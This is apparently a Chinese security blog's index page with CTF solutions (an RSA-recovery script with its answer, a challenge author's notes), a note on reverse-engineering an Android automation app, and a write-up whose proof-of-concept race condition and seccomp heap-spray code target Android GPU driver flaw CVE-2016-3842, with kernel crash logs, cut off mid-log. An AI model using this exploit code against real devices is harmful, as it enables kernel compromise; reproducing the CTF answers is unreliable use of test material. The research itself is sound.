<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="chrome=1">
  
  <title>Ericky1992</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
  
    <meta name="author" content="Ericky1992">
  
  
  <meta name="description" content="忘記妳是最痛苦的解藥">
<meta property="og:type" content="website">
<meta property="og:title" content="Ericky1992">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="Ericky1992">
<meta property="og:description" content="忘記妳是最痛苦的解藥">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Ericky1992">
<meta name="twitter:description" content="忘記妳是最痛苦的解藥">
  
  
    <link rel="icon" type="image/x-icon" href="/favicon.ico">
  
  <link rel="stylesheet" href="/css/style.css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  
</head>

<body>
  <div class="wrapper">
    <header id="header">
  <div class="title">
    <h1><a href="/">Ericky1992</a></h1>
    <p><a href="/">pursue ceaselessly</a></p>
  </div>
  <nav class="nav">
    <ul>
      
        <li><a href="/">Home</a></li>
      
        <li><a href="/archives">Archives</a></li>
      
        <li><a href="/">About</a></li>
      
      
    </ul>
    <div class="clearfix"></div>
  </nav>
  <div class="clearfix"></div>
</header>
    <div class="content">




  
    <article class="post">
  <header>
    
      <div class="icon"></div>
      <a href="/2017/06/30/看雪2017CTF第十题/">
  <time datetime="2017-06-30T08:24:08.000Z">
    2017-06-30
  </time>
</a>
    
    
  
    <h1 class="title"><a href="/2017/06/30/看雪2017CTF第十题/">看雪2017CTF第十题</a></h1>
  

  </header>
  
  <div class="entry">
    
      <p>对gmp和RSA不熟悉，从头到尾追了很长时间。这两天也逼着自己熟悉了很多东西，学到了不少。</p>
<h2 id="1-初探"><a href="#1-初探" class="headerlink" title="1.初探"></a>1.初探</h2><p>程序是X64的，不管三七二十一，先拖到IDA里面看一下，由于一开始都不知道gmp是什么东西，便一边用OD调试，一边IDA傻傻看代码，一个函数一个函数看。经过漫长而又漫长的分析，结合阅读gmp的源代码，把IDA中的函数对应上了，如下：<br><img src="http://img.blog.csdn.net/20170630162246756?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGs5MjU5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
<h2 id="2-关于gmp"><a href="#2-关于gmp" class="headerlink" title="2.关于gmp"></a>2.关于gmp</h2><p>GMP简介：GMP是著名的任意精度算术运算库，支持任意精度的整数、有理数以及浮点数的四则运算、求模、求幂、开方等基本运算，还支持部分数论相关运算。Maple、Mathematica等大型数学软件的高精度算术运算功能都是利用GMP实现的。</p>
<p>理清楚函数的意思，可以来看看到底实现了什么。<br>介绍一下目标程序使用的一些gmp函数，如下：<br>void mpz_init (mpz_t x)<br>初始化x。任何一个mpz_t类型的变量在使用前都应该初始化。</p>
<p>int mpz_init_set_str (mpz_t rop, const char *str, int base)<br>初始化rop，并赋值rop = str，其中str是一个表示base进制整数的字符数组</p>
<p>int mpz_probab_prime_p (const mpz_t n, int reps)<br>检测n是否为素数。该函数首先对n进行试除，然后使用米勒-拉宾素性检测对n进行测试，reps表示进行检测的次数。如果n为素数，返回2；如果n可能为素数，返回1；如果n为合数，返回0。</p>
<p>void mpz_mul (mpz_t rop, const mpz_t op1, const mpz_t op2)<br>计算op1 * op2，结果保存在rop中</p>
<p>int mpz_invert(mpz_t rop, const mpz_t op1, const mpz_t op2)<br>求数论倒数函数</p>
<p>void mpz_init_set_si (mpz_t rop, signed long int op)<br>初始化rop，并将其值设置为op</p>
<p>int mpz_cmp (mpz_t op1, mpz_t op2)<br>比较函数</p>
<p>void mpz_mod (mpz_t r, const mpz_t n, const mpz_t d)<br>求模函数，返回值不为负数</p>
<p>把这些函数的意思弄明白了，就能发现这是一个RSA算法：</p>
<p>RSA算法大体可以分为三个部分：<br>生成密钥对<br>加密<br>解密<br>其中生成密钥对包括以下步骤：<br>随机生成两个足够大的素数<br>p,q<br>计算公共模数n<br>n=p∗q<br>计算欧拉函数<br>φ(n)=(p−1)∗(q−1)<br>选取一较小的与φ(n)互质的正整数e作为公共指数。则数对(n, e)为密钥对中的公钥<br>计算<br>d=e−1(modϕ(n))<br>则数对(n, d)为密钥对中的私钥<br>这里推荐2篇RSA相关文章<br><a href="http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html" target="_blank" rel="external">http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html</a><br><a href="http://www.ruanyifeng.com/blog/2013/07/rsa_algorithm_part_two.html" target="_blank" rel="external">http://www.ruanyifeng.com/blog/2013/07/rsa_algorithm_part_two.html</a></p>
<p>搞懂了这些之后，就可以开始写程序了</p>
<h2 id="3-脚本"><a href="#3-脚本" class="headerlink" title="3.脚本:"></a>3.脚本:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">import gmpy2</div><div class="line">			  </div><div class="line">N = gmpy2.mpz(0x6248BC3AB92A33B000FDB88568F19727F92F79EB68FF6AD73203EFD20A3E331BE941C7AA288095F33BC4B255FD983114D480EFFBEE2E313E6218A57F9CCC8189)</div><div class="line">d = gmpy2.mpz(0x2476A7F02588913F228923E1F36F963F29708C07B117396817A6B94C336FC77FF7D381925EB40CFED8FBE894570155E41569B4EC69B26CB0320105A29651CB4B)</div><div class="line">e = gmpy2.mpz(0x1)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line"></div><div class="line">	while e &lt; 0x1000000:</div><div class="line">		e = e +1</div><div class="line">		kfi = gmpy2.mul(e,d)-1</div><div class="line">		k = gmpy2.div(kfi,N)</div><div class="line"></div><div class="line">		if kfi%(k+1) == 0:		</div><div class="line">			x = 1-kfi/(k+1)+N</div><div class="line">			if x &gt; 0 and x &lt; 0x100000000000000000000000000000000000000000000000000000000000000000:</div><div class="line">				print &apos;e:&apos; + hex(e)</div><div class="line">				print &apos;x:&apos; + hex(x)</div><div class="line">				continue;</div><div class="line"></div><div class="line"></div><div class="line">	#X2 = gmpy2.mul(x,x)</div><div class="line">	#N4 = gmpy2.mul(N,4)</div><div class="line">	#delta = gmpy2.sub(X2,N4)</div><div class="line"></div><div class="line">	delta_root = gmpy2.mpz(0x23c4ffb7dff4f383202beb418be684edaad4c1838af43e9ea0a731d0ea495f00)</div><div class="line">	print &apos;delta_root:&apos; + hex(delta_root)</div><div class="line">	fenzi = gmpy2.add(x,delta_root)</div><div class="line">	fenzi2 = gmpy2.sub(x,delta_root)</div><div class="line">	p1 =  gmpy2.div(fenzi,2)</div><div class="line">	p2 = gmpy2.div(fenzi2,2)</div><div class="line">	print &apos;p1 =&apos; + hex(p1) </div><div class="line">	print &apos;p2 =&apos; + hex(p2)</div></pre></td></tr></table></figure>
<p>结果：<br><img src="http://img.blog.csdn.net/20170630162403992?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGs5MjU5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
<p>答案：<br>F552B38DBDDE72E2E693B2AED5C769C0DCB3DA83534480A80E652FFE53544CD91A18C3</p>

    
  </div>
  <footer class="end-sep">
    
      
      
    
    <div class="clearfix"></div>
  </footer>
</article>


  
    <article class="post">
  <header>
    
      <div class="icon"></div>
      <a href="/2017/06/14/看雪CTF 2017 第六题设计思路和解题思路/">
  <time datetime="2017-06-14T13:41:08.000Z">
    2017-06-14
  </time>
</a>
    
    
  
    <h1 class="title"><a href="/2017/06/14/看雪CTF 2017 第六题设计思路和解题思路/">看雪CTF 2017 第六题设计思路和解题思路</a></h1>
  

  </header>
  
  <div class="entry">
    
      <p>这道题主要需要花时间搞清楚套路，就迎刃而解了。^_^ </p>
<h3 id="1-java层稍作字符串加密和类名方法名混淆处理-本来是打算java层也做点文章的"><a href="#1-java层稍作字符串加密和类名方法名混淆处理-本来是打算java层也做点文章的" class="headerlink" title="1.java层稍作字符串加密和类名方法名混淆处理(本来是打算java层也做点文章的@_@)"></a>1.java层稍作字符串加密和类名方法名混淆处理(本来是打算java层也做点文章的@_@)</h3><p><img src="http://img.blog.csdn.net/20170614213843087?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGs5MjU5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"><br>解题：通过阅读代码，可以知道check函数为关键函数，当返回为真的时候，注册成功。</p>
<h3 id="2-so层用花指令对程序指令进行混淆，在一定程度上防止分析。"><a href="#2-so层用花指令对程序指令进行混淆，在一定程度上防止分析。" class="headerlink" title="2.so层用花指令对程序指令进行混淆，在一定程度上防止分析。"></a>2.so层用花指令对程序指令进行混淆，在一定程度上防止分析。</h3><p><img src="http://img.blog.csdn.net/20170614213921432?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGs5MjU5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
<p>解题：编写去花指令脚本，F5就会变得很简单。去花后check函数如下：<br><img src="http://img.blog.csdn.net/20170614213941745?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGs5MjU5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
<p>这样就能很清楚看到注册过程了，第一个while循环释放存放好的字符串到byte_20020。sub_19DA8为加密函数，返回结果到v14，最后v14与byte_20020做比较，一样就行了。算法采用了RC4加密+base64编码。</p>
<h3 id="3-值得一提的是，so中藏关键字符串数据的方式我自己觉得挺有意思的。不知道聪明的你有没有发现呢？如果不会去花也不要紧，还有一个解题的思路就是是找到最后的汇编cmp，下好断点，因为这个算法的缘故。java层可以遍历传入字符串进行遍历暴力破解。"><a href="#3-值得一提的是，so中藏关键字符串数据的方式我自己觉得挺有意思的。不知道聪明的你有没有发现呢？如果不会去花也不要紧，还有一个解题的思路就是是找到最后的汇编cmp，下好断点，因为这个算法的缘故。java层可以遍历传入字符串进行遍历暴力破解。" class="headerlink" title="3.值得一提的是，so中藏关键字符串数据的方式我自己觉得挺有意思的。不知道聪明的你有没有发现呢？如果不会去花也不要紧，还有一个解题的思路就是是找到最后的汇编cmp，下好断点，因为这个算法的缘故。java层可以遍历传入字符串进行遍历暴力破解。"></a>3.值得一提的是，so中藏关键字符串数据的方式我自己觉得挺有意思的。不知道聪明的你有没有发现呢？如果不会去花也不要紧，还有一个解题的思路就是是找到最后的汇编cmp，下好断点，因为这个算法的缘故。java层可以遍历传入字符串进行遍历暴力破解。</h3><h3 id="4-总结一下，我自己想到了两个解题方式，一个暴力解题，一个去花解题。从男人刚正面的角度来讲，这道题主要就是考去花，没有加其他的东西了，直接被大佬们秒得体无完肤。。。先行膜拜。最后附上答案：madebyericky94528"><a href="#4-总结一下，我自己想到了两个解题方式，一个暴力解题，一个去花解题。从男人刚正面的角度来讲，这道题主要就是考去花，没有加其他的东西了，直接被大佬们秒得体无完肤。。。先行膜拜。最后附上答案：madebyericky94528" class="headerlink" title="4.总结一下，我自己想到了两个解题方式，一个暴力解题，一个去花解题。从男人刚正面的角度来讲，这道题主要就是考去花，没有加其他的东西了，直接被大佬们秒得体无完肤。。。先行膜拜。最后附上答案：madebyericky94528"></a>4.总结一下，我自己想到了两个解题方式，一个暴力解题，一个去花解题。从男人刚正面的角度来讲，这道题主要就是考去花，没有加其他的东西了，直接被大佬们秒得体无完肤。。。先行膜拜。最后附上答案：madebyericky94528</h3>
    
  </div>
  <footer class="end-sep">
    
      
      
    
    <div class="clearfix"></div>
  </footer>
</article>


  
    <article class="post">
  <header>
    
      <div class="icon"></div>
      <a href="/2017/06/12/逆向完整还原触摸精灵2.X版本工程代码/">
  <time datetime="2017-06-12T14:25:00.000Z">
    2017-06-12
  </time>
</a>
    
    
  
    <h1 class="title"><a href="/2017/06/12/逆向完整还原触摸精灵2.X版本工程代码/">逆向完整还原触摸精灵2.X版本工程代码</a></h1>
  

  </header>
  
  <div class="entry">
    
      <p>1.先介绍一下触摸精灵，触摸精灵是一款移动平台上能模拟手动操作的软件，可以回放录制的动作，也可以通过编程来实现更为复杂的功能。触摸精灵提供了便捷的找色、识字、网络、打码等易用的扩展函数，能满足许多复杂的需求。</p>
<p>2.然后介绍一下背景，应该是2015年3月左右的时候，当时我还在上海(挺怀念那段时光的) ，而这款产品是在淘宝上看到的(当时的销量十分好)。我对这个东西也特别特别感兴趣，下定决心就开始了。因为都说C++难，我也不会C++，就找了当时最后的一个native是C语言的版本，如果没弄错的话应该是2.7，前前后后、断断续续弄了2个月，把代码都还原出来了。</p>
<p>3.本来是打算逆向后做一个产品出来，后来就自己一个人，不了了之了。这里说一下这款产品的难点，难点还是android系统的碎片化太严重，每一个触摸事件在不同的手机里的表示都不一样，在A手机中一个触摸可能是4个event，但是可能在其他的手机中是8个甚至20个event，所以对event事件的解析是一个很大的问题。因为android 碎片化的问题很严重，导致了找图找色函数中需要读取图像RGBA的位置极难统一</p>
<p>4.这里附件的代码我有自己去兼容一些当时自己能找到的手机，然后自己加了很多的功能函数，最后跟3.X的触摸精灵功能并相差不多。新论坛第一次发帖，好不习惯，还是喜欢老的论坛，有底蕴！</p>
<p>5.以前录的2个视频，能直观看到这个app的作用，地址如下：<br><a href="http://v.youku.com/v_show/id_XOTQ3MzUzMjA0.html" target="_blank" rel="external">http://v.youku.com/v_show/id_XOTQ3MzUzMjA0.html</a><br><a href="http://v.youku.com/v_show/id_XOTQ3MzM3MzA4.html" target="_blank" rel="external">http://v.youku.com/v_show/id_XOTQ3MzM3MzA4.html</a></p>
<p>最后说一下，如果有什么关于手游脚本的问题，都可以跟帖问我，我会尽力回答的。</p>
<p>[<em>_</em>]   代码很搓。。。请各位大大手下留情<br>代码下载：<a href="http://bbs.pediy.com/thread-215896.htm" target="_blank" rel="external">http://bbs.pediy.com/thread-215896.htm</a></p>

    
  </div>
  <footer class="end-sep">
    
      
      
    
    <div class="clearfix"></div>
  </footer>
</article>


  
    <article class="post">
  <header>
    
      <div class="icon"></div>
      <a href="/2016/09/12/实现CVE-2016-3842的堆喷/">
  <time datetime="2016-09-12T14:33:00.000Z">
    2016-09-12
  </time>
</a>
    
    
  
    <h1 class="title"><a href="/2016/09/12/实现CVE-2016-3842的堆喷/">实现CVE-2016-3842的堆喷</a></h1>
  

  </header>
  
  <div class="entry">
    
      <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>看到论坛有大牛分析了这个CVE-2016-3842的利用方法，我之前也对这个漏洞的堆喷做了一些笔记，这里分享一下。首先要先感谢一下某因幡和Retme两位大神，在研究这个漏洞期间遇到不少的问题，他们都一一给我解答了，这里对他们表示再次感谢。</p>
<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>这个漏洞是GPU中的一个UAF漏洞，是由于race condition 造成的。在GPU驱动中提供了一个ioctl命令IOCTL_KGSL_GPUMEM_ALLOC ，这个命令可以让用户去分配一块GPU共享内存。当一个线程调用这个ioctl之后，程序会创建一个kgsl_mem_entry的结构体用来描述一块已经分配好的内存。与此同时函数kgsl_mem_entry_attach_process会通过调用idr_alloc函数给kgsl_mem_entry分配一个ID。在这个时候，另外一个线程调用 IOCTL_KGSL_GPUMEM_FREE_ID 的ioctl命令去释放这个内存块，如果能在分配函数完成之前将这个kgsl_mem_entry释放掉，那么直接就造成了UAF了。</p>
<p>再来看一下官方介绍：<br>If we add the mem entry pointer in the process idr and rb tree too early, other threads can do operations on the entry by guessing the ID or GPU address before the object gets returned by the creating operation.</p>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>因为每在内核分配的第一个kgsl_mem_entry所分配的ID为1，所以可以准确释放刚分配好的内存块。<br>代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">void kgsl2()&#123;</div><div class="line">  </div><div class="line">  int fd = open(&quot;/dev/kgsl-3d0&quot;,0);</div><div class="line">  </div><div class="line">  struct kgsl_gpumem_alloc arg;</div><div class="line">  struct kgsl_gpumem_free_id arg_free;</div><div class="line">  int ret = 0;</div><div class="line">  </div><div class="line">  arg.gpuaddr = 0x1000;</div><div class="line">  arg.size = 0x40;</div><div class="line">  arg.flags = 0x1000008;</div><div class="line">  </div><div class="line">  int pid = fork();</div><div class="line">  if(pid)&#123;</div><div class="line">      while(1)&#123;</div><div class="line">        arg_free.id = 1;</div><div class="line">        ioctl(fd,IOCTL_KGSL_GPUMEM_FREE_ID, &amp;arg_free);</div><div class="line">      &#125;</div><div class="line">  &#125;</div><div class="line">  </div><div class="line">    ret = ioctl(fd,IOCTL_KGSL_GPUMEM_ALLOC, &amp;arg);</div><div class="line">    if(ret)&#123;</div><div class="line">      perror(&quot;alloc&quot;);</div><div class="line">    &#125;</div><div class="line">  </div><div class="line">&#125;</div><div class="line">  </div><div class="line">int main()&#123;</div><div class="line">    printf(&quot;******CVE-2016-3842******&quot; );</div><div class="line">    kgsl2();</div><div class="line"> </div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="Crash-Log："><a href="#Crash-Log：" class="headerlink" title="Crash Log："></a>Crash Log：</h2><p>[ 4624.507633] Modules linked in:<br>[ 4624.507921] CPU: 0 PID: 7500 Comm: CVE-2016-3842 Tainted: G        W    3.10.73-g1bbb776-dirty #13<br>[ 4624.508026] task: ffffffc042c25600 ti: ffffffc03db7c000 task.ti: ffffffc03db7c000<br>[ 4624.508232] PC is at _raw_spin_lock+0x24/0x5c<br>[ 4624.508421] LR is at _raw_spin_lock+0x20/0x5c<br>[ 4624.508525] pc : [<ffffffc001005584>] lr : [<ffffffc001005580>] pstate: 60000145<br>[ 4624.508712] sp : ffffffc03db7fc30<br>[ 4624.508815] x29: ffffffc03db7fc30 x28: ffffffc03db7c000<br>[ 4624.509113] x27: 0000000000000044 x26: 0000000000000000<br>[ 4624.509494] x25: ffffffc001fe7e18 x24: 00000000c0000000<br>[ 4624.509787] x23: 0000000000000001 x22: ffffffc01d9e941c<br>[ 4624.510170] x21: 0000000000000000 x20: ffffffc001d91000<br>[ 4624.510467] x19: 000000000000001c x18: 0000000000000000<br>[ 4624.510855] x17: 0000000000000001 x16: ffffffc0003455f8<br>[ 4624.511156] x15: 0000007fa7426028 x14: 0000007fa7426018<br>[ 4624.511535] x13: 0000000000000003 x12: 0000000000000001<br>[ 4624.511830] x11: 0000000000000001 x10: 000000000000000d<br>[ 4624.512209] x9 : 000000000046dc68 x8 : 000000000000001d<br>[ 4624.512511] x7 : 0000000000000001 x6 : 0000000000000000<br>[ 4624.512807] x5 : 0000000000000000 x4 : 0000007fd7478a88<br>[ 4624.513190] x3 : 0000000000000000 x2 : 0000000000000000<br>[ 4624.513488] x1 : 00000000fe9223ab x0 : ffffffc001d49690<br>[ 4624.513867]<br>[ 4624.513972] Process CVE-2016-3842 (pid: 7500, stack limit = 0xffffffc03db7c058)<br>[ 4624.514158] Call trace:<br>[ 4624.514264] [<ffffffc001005584>] _raw_spin_lock+0x24/0x5c<br>[ 4624.514378] [<ffffffc000611504>] _sharedmem_free_entry+0x84/0x2a4<br>[ 4624.514570] [<ffffffc0006118b0>] kgsl_ioctl_gpumem_free_id+0x10c/0x12c<br>[ 4624.514677] [<ffffffc000617668>] kgsl_ioctl_helper+0x250/0x2ec<br>[ 4624.514865] [<ffffffc000617740>] kgsl_ioctl+0x3c/0x4c<br>[ 4624.514975] [<ffffffc000345520>] do_vfs_ioctl+0x4a4/0x57c<br>[ 4624.515163] [<ffffffc000345660>] SyS_ioctl+0x68/0x94<br>[ 4624.515271] Code: 97c822ff 52800020 97c94706 f9800271 (885ffe60)<br>[ 4624.515635] —[ end trace b6c5dfe1e97b62c8 ]—<br>[ 4624.583132] Kernel panic - not syncing: Fatal exception<br>[ 4624.583362] CPU1: stopping</ffffffc000345660></ffffffc000345520></ffffffc000617740></ffffffc000617668></ffffffc0006118b0></ffffffc000611504></ffffffc001005584></ffffffc001005580></ffffffc001005584></p>
<h2 id="实际堆喷中遇到的问题"><a href="#实际堆喷中遇到的问题" class="headerlink" title="实际堆喷中遇到的问题"></a>实际堆喷中遇到的问题</h2><h4 id="1-使用seccomp被拦截"><a href="#1-使用seccomp被拦截" class="headerlink" title="1.使用seccomp被拦截"></a>1.使用seccomp被拦截</h4><p>用的是seccomp这个syscall来进行堆喷，seccomp被拦截了，如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Ericky:CVE-2016-3842 heyao$ adb shell ./data/local/tmp/CVE-2016-3842</div><div class="line">prog.len:18</div><div class="line">prctl(SECCOMP): Permission denied</div></pre></td></tr></table></figure>
<p>在提示过后，查看android内核源码，发现并不需要任何权限，但是要在使用之前设置一个Admin的进程属性来绕过。</p>
<h4 id="2-堆喷如何判断是否成功"><a href="#2-堆喷如何判断是否成功" class="headerlink" title="2.堆喷如何判断是否成功"></a>2.堆喷如何判断是否成功</h4><p>调试漏洞时，选择自己能改内核代码的机器来调。printk就能直观显示是否成功。</p>
<p>还有相对高级的方法是，可以在喷的内容中做一些标记，比如deadbeef，这样喷上去之后在崩溃，crash寄存器中会有反馈。</p>
<p>建议优先用printk。</p>
<h4 id="3-崩溃日志的疑问"><a href="#3-崩溃日志的疑问" class="headerlink" title="3.崩溃日志的疑问"></a>3.崩溃日志的疑问</h4><p>按漏洞的原理来看，崩溃时候的函数应该是顺着IOCTL_KGSL_MAP_USER_MEM这个ioctl的，但是为什么崩溃信息里为什么会是这个函数导致崩溃的呢？看这个崩溃信息，让我有点迷糊了，不知道准确的触发时机是什么时候了，是不是在我的机器上就是这个函数触发的崩溃？<br><img src="http://img.blog.csdn.net/20170612223024471?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGs5MjU5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
<p>ShenDi大神的说法是这样的， “触发时机是有2～3处的，这取决于free的时机，你没法控制这个时机，但是如果你能喷堆成功，就能保证这2～3个时机都不会崩溃。”后来经我的验证，是因为我用的是5X的机器，而他用的是6P，崩溃信息确实不一样。</p>
<h4 id="4-关于堆喷结构体sock-filter"><a href="#4-关于堆喷结构体sock-filter" class="headerlink" title="4.关于堆喷结构体sock_filter"></a>4.关于堆喷结构体sock_filter</h4><p>对于sock_filter，如果不加修饰的随便定义这个结构体去喷，虽然它也会被kmalloc，只不过之后校验参数的时候 会失败，然后会被free掉，这个值得注意。因为如果seccomp失败的话，调用一次和调用一万次是没有区别的，kmalloc会永远落在同一个object上。</p>
<p>了解了以上这些，就可以开始尝试堆喷了，堆喷代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line">void *heap_spray_tid(void *args)&#123;</div><div class="line">     struct sock_filter filter[] = &#123;  </div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line"> </div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line"> </div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line"> </div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">     &#125;;</div><div class="line">   struct sock_fprog prog = &#123;</div><div class="line">      .len = (unsigned short)(sizeof(filter)/sizeof(filter[0])),</div><div class="line">      .filter = filter,</div><div class="line">   &#125;;</div><div class="line">   if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) != 0) &#123;</div><div class="line">           printf(&quot;PR_SET_NO_NEW_PRIVS Failed......!\n&quot;);</div><div class="line">           return 1;</div><div class="line">       &#125;</div><div class="line"> </div><div class="line"> </div><div class="line">   for (; !heap_spray_done;) &#123;</div><div class="line"> </div><div class="line">    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog)) &#123;</div><div class="line">           perror(&quot;prctl(SECCOMP)&quot;);</div><div class="line">         &#125;else&#123;</div><div class="line"> </div><div class="line">         &#125;</div><div class="line">   &#125;</div><div class="line">｝</div></pre></td></tr></table></figure>
<p>内核print堆喷信息如下：<br><img src="http://img.blog.csdn.net/20170612223146871?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGs5MjU5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
<p>经过不断的尝试，最后堆喷成功：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line">[  127.245287] Unable to handle kernel paging request at virtual address 17fff000c</div><div class="line">[  127.245303] pgd = ffffffc050824000</div><div class="line">[  127.245308] [17fff000c] *pgd=0000000000000000</div><div class="line">[  127.245320] Internal error: Oops: 96000005 [#1] PREEMPT SMP</div><div class="line">[  127.245330] CPU: 0 PID: 5453 Comm: CVE-2016-3842 